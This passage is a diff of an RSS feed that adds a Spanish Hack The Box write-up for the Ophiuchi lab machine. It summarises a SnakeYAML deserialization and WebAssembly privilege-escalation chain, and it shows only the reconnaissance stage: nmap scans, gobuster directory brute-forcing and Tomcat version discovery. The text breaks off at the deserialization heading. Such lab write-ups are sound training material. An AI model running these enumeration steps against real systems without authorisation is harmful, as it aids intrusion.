@@ -12,7 +12,7 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>es</language>
     <copyright>©{year}, All Rights Reserved</copyright>
-    <lastBuildDate>Sat, 26 Jun 2021 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Sat, 03 Jul 2021 00:00:00 +0000</lastBuildDate>
     <sy:updatePeriod>daily</sy:updatePeriod>
     <sy:updateFrequency>daily</sy:updateFrequency>
     
@@ -21,6 +21,837 @@
     
     
 
+      
+      <item>
+        <title>Hack The Box - Ophiuchi</title>
+        <link>https://sckull.github.io/posts/ophiuchi/</link>
+        <pubDate>Sat, 03 Jul 2021 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Sat, 03 Jul 2021 00:00:00 +0000</atom:modified>
+        <guid>https://sckull.github.io/posts/ophiuchi/</guid>
+        <description>Ophiuchi presenta una vulnerabilidad de deserializacion en java en YAML con la cual se obtuvieron credenciales de tomcat y acceso a la maquina.</description>
+        <content:encoded>
+
+
+
+  
+
+
+
+  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
+    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/ophiuchi/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
+  &lt;/div&gt;
+
+&lt;p&gt;Ophiuchi presenta una vulnerabilidad de deserializacion en java en YAML con la cual se obtuvieron credenciales de tomcat y acceso a la maquina. Mediante el analisis de un archivo en Go se creó un archivo WebAssembly para ejecutar un script en bash el cual proporciona permisos sobre bash para finalmente obtener acceso como root.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Nombre&lt;/th&gt;
+&lt;th align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/315&#34;&gt;Ophiuchi&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;OS&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;Linux&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;30&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;Media&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;10.10.10.227&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_maker&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/27390&#34;&gt;felamos&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/27390&#34; class=&#34;img_user_maker&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;
+&lt;a href=&#34;#single__title&#34; class=&#34;button&#34; style=&#34;width: 72px; height: 30px; pointer-events: none;&#34;  data-color=&#34;default&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&gt;
+  &lt;span class=&#34;button__text&#34;&gt;
+    Matrix
+  &lt;/span&gt;
+&lt;/a&gt;&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;&lt;div class=&#34;box&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-chart&#34; data-lang=&#34;chart&#34;&gt;{
+   &amp;quot;type&amp;quot;:&amp;quot;radar&amp;quot;,
+   &amp;quot;data&amp;quot;:{
+      &amp;quot;labels&amp;quot;:[&amp;quot;Enumeration&amp;quot;,&amp;quot;Real-Life&amp;quot;,&amp;quot;CVE&amp;quot;,&amp;quot;Custom Explotation&amp;quot;,&amp;quot;CTF-Like&amp;quot;],
+      &amp;quot;datasets&amp;quot;:[
+         {
+            &amp;quot;label&amp;quot;:&amp;quot;User Rate&amp;quot;,  &amp;quot;data&amp;quot;:[4.8, 5, 5.2, 4.8, 5],
+            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(75, 162, 189,0.5)&amp;quot;,
+            &amp;quot;borderColor&amp;quot;:&amp;quot;#4ba2bd&amp;quot;
+         },
+         { 
+            &amp;quot;label&amp;quot;:&amp;quot;Maker Rate&amp;quot;,
+            &amp;quot;data&amp;quot;:[0, 0, 0, 0, 0],
+            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(154, 204, 20,0.5)&amp;quot;,
+            &amp;quot;borderColor&amp;quot;:&amp;quot;#9acc14&amp;quot;
+         }
+      ]
+   },
+    &amp;quot;options&amp;quot;: {&amp;quot;scale&amp;quot;: {&amp;quot;ticks&amp;quot;: {&amp;quot;backdropColor&amp;quot;:&amp;quot;rgba(0,0,0,0)&amp;quot;},
+            &amp;quot;angleLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;},
+            &amp;quot;gridLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;}
+        }
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h1 id=&#34;nmap&#34;&gt;NMAP&lt;/h1&gt;
+&lt;p&gt;Escaneo de puertos con nmap nos muestra el puerto http (8080) y el puerto ssh (22) abiertos.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.91 scan initiated Fri Apr  2 02:24:15 2021 as: nmap -p- --min-rate 10000 -oN allports 10.10.10.227&lt;/span&gt;
+Warning: 10.10.10.227 giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.227 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.10.227&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.089s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span class=&#34;m&#34;&gt;44312&lt;/span&gt; closed ports, &lt;span class=&#34;m&#34;&gt;21221&lt;/span&gt; filtered ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+8080/tcp open  http-proxy
+
+&lt;span class=&#34;c1&#34;&gt;# Nmap done at Fri Apr  2 02:25:19 2021 -- 1 IP address (1 host up) scanned in 63.77 seconds&lt;/span&gt;
+
+&lt;span class=&#34;c1&#34;&gt;# Nmap 7.91 scan initiated Fri Apr  2 02:26:02 2021 as: nmap -p 22,8080 -sV -sC -oN servicesports 10.10.10.227&lt;/span&gt;
+Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.227 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.10.227&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.065s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;3072&lt;/span&gt; 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+8080/tcp open  http    Apache Tomcat 9.0.38
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Parse YAML
+Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;span class=&#34;c1&#34;&gt;# Nmap done at Fri Apr  2 02:26:12 2021 -- 1 IP address (1 host up) scanned in 10.10 seconds&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h1 id=&#34;http&#34;&gt;HTTP&lt;/h1&gt;
+&lt;p&gt;Encontramos una pagina web en el puerto 8080 en la cual es posible parsear sintaxis YAML, aunque al enviar una sintaxis se muestra un mensaje el cual indica que ha sido removida esta funcionalidad.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/htb/ophiuchi/Screenshot_2.png&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/htb/ophiuchi/Screenshot_1.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
+&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/htb/ophiuchi&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+└─$ gobuster dir -u http://10.10.10.227:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,yaml,bak -q -t &lt;span class=&#34;m&#34;&gt;50&lt;/span&gt;
+/test &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/manager &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/yaml &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;tomcat-&#34;&gt;TOMCAT&lt;/h2&gt;
+&lt;p&gt;En las direcciones encontradas vemos el panel de login basico de TOMCAT.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;HTTP/1.1 &lt;span class=&#34;m&#34;&gt;401&lt;/span&gt; 
+Cache-Control: private
+Expires: Thu, &lt;span class=&#34;m&#34;&gt;01&lt;/span&gt; Jan &lt;span class=&#34;m&#34;&gt;1970&lt;/span&gt; 00:00:00 GMT
+WWW-Authenticate: Basic &lt;span class=&#34;nv&#34;&gt;realm&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Tomcat Manager Application&amp;#34;&lt;/span&gt;
+Content-Type: text/html&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ISO-8859-1
+Content-Length: &lt;span class=&#34;m&#34;&gt;2499&lt;/span&gt;
+Date: Sat, &lt;span class=&#34;m&#34;&gt;03&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; 06:08:57 GMT
+
+&amp;lt;!DOCTYPE html PUBLIC &lt;span class=&#34;s2&#34;&gt;&amp;#34;-//W3C//DTD HTML 4.01//EN&amp;#34;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://www.w3.org/TR/html4/strict.dtd&amp;#34;&lt;/span&gt;&amp;gt;
+&amp;lt;html&amp;gt;
+ &amp;lt;head&amp;gt;
+  &amp;lt;title&amp;gt;401 Unauthorized&amp;lt;/title&amp;gt;
+  &amp;lt;style &lt;span class=&#34;nv&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;text/css&amp;#34;&lt;/span&gt;&amp;gt;
+    &amp;lt;!--
+    BODY &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;font-family:Tahoma,Arial,sans-serif&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;color:black&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;background-color:white&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;font-size:12px&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+    H1 &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;font-family:Tahoma,Arial,sans-serif&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;color:white&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;background-color:#525D76&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;font-size:22px&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+    PRE, TT &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;border: 1px dotted &lt;span class=&#34;c1&#34;&gt;#525D76}&lt;/span&gt;
+    A &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;color : black&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;A.name &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;color : black&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+    --&amp;gt;
+  &amp;lt;/style&amp;gt;
+ &amp;lt;/head&amp;gt;
+ &amp;lt;body&amp;gt;
+   &amp;lt;h1&amp;gt;401 Unauthorized&amp;lt;/h1&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Además logramos obtener la version realizando una solicitud a una direccion falsa.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/htb/ophiuchi&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+└─$ curl -s http://10.10.10.227:8080/batman &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;html2text&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep &lt;span class=&#34;s2&#34;&gt;&amp;#34;Tomcat&amp;#34;&lt;/span&gt;
+**** Apache Tomcat/9.0.38 ****
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h1 id=&#34;snakeyaml-deserialization&#34;&gt;SNAKEYAML DESERIALIZATION&lt;/h1&gt;
